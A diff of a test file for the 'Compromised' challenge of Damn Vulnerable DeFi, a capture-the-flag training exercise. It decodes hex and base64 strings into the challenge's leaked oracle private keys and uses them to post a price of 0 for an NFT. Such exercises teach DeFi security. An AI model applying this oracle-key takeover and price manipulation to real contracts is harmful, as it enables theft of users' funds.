@@ -53,9 +53,13 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const source2Signer = new ethers.Wallet('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', ethers.provider); //bytes to utf8 to base64 decode
+        const source2SignerHex = "4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535"; //ref: https://www.damnvulnerabledefi.xyz/challenges/compromised/
+        const source2SignerBase64 = Buffer.from(source2SignerHex, 'hex'); 
+        const source2Signer = new ethers.Wallet(atob(source2SignerBase64), ethers.provider); //hex to base64 and decode
         expect(source2Signer.address).to.be.equal(sources[1]);
-        const source3Signer = new ethers.Wallet('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', ethers.provider); //bytes to utf8 to base64 decode
+        const source3SignerHex = "4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134"; //ref: https://www.damnvulnerabledefi.xyz/challenges/compromised/
+        const source3SignerBase64 = Buffer.from(source3SignerHex, 'hex'); 
+        const source3Signer = new ethers.Wallet(atob(source3SignerBase64), ethers.provider); //bytes to utf8 to base64 decode
         expect(source3Signer.address).to.be.equal(sources[2]);
 
         await oracle.connect(source2Signer).postPrice('DVNFT', 0);
